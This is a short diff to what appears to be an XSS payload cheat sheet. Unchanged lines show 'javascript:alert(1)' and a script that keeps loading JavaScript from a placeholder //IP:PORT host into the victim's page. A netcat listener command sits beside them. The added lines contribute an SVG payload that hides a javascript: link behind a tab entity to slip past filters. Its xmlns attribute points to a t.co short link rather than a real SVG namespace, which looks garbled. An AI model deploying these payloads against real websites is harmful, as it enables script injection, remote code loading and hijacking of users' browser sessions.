@@ -39,6 +39,14 @@ javascript:alert(1)
 A remote JS reverse shell payload
 <pre>&lt;script&gt;setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)&lt;/script&gt;
 </pre>
+SVG-embedded payload
+<pre>&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;svg viewBox="0 0 100 100" xmlns="https://t.co/ZF7xUkMN3m"&gt;
+&lt;a href="javascript&amp;#9;:alert(1)"&gt;
+&lt;circle cx="50" cy="40" r="35"/&gt;
+&lt;/a&gt;
+&lt;svg&gt;
+</pre>
 Reverse check request by nc
 <pre>nc -lvvp 1333
 </pre>
